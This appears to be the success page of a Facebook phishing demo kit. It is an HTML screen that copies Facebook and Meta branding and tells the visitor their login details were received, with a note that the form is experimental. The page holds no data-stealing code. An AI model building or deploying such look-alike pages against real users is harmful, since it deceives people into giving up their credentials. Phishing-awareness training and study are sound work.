<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
    <title>Logged in — Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif; }

        body {
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card {
            background: #fff;
            border-radius: 16px;
            padding: 48px 36px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        }

        .fb-icon {
            width: 72px;
            height: 72px;
            margin: 0 auto 24px;
        }

        h1 {
            font-size: 22px;
            color: #1c1e21;
            margin-bottom: 10px;
        }

        p {
            font-size: 15px;
            color: #65676b;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        .btn {
            display: inline-block;
            background: #0866FF;
            color: #fff;
            text-decoration: none;
            border-radius: 50px;
            padding: 14px 32px;
            font-size: 16px;
            font-weight: 600;
            transition: background 0.2s;
        }

        .btn:hover { background: #0759e0; }

        .meta-logo {
            width: 80px;
            margin-top: 32px;
            opacity: 0.6;
        }
    </style>
</head>
<body>
    <div class="card">
        <img src="image/fb_white_f.png" alt="Facebook" class="fb-icon">
        <h1>You're connected!</h1>
        <p>Your login details were received successfully. This is an experimental form — no real account was accessed.</p>
        <a href="index.html" class="btn">Back to login</a>
        <br>
        <img src="image/meta_black.png" alt="Meta" class="meta-logo">
    </div>
</body>
</html>
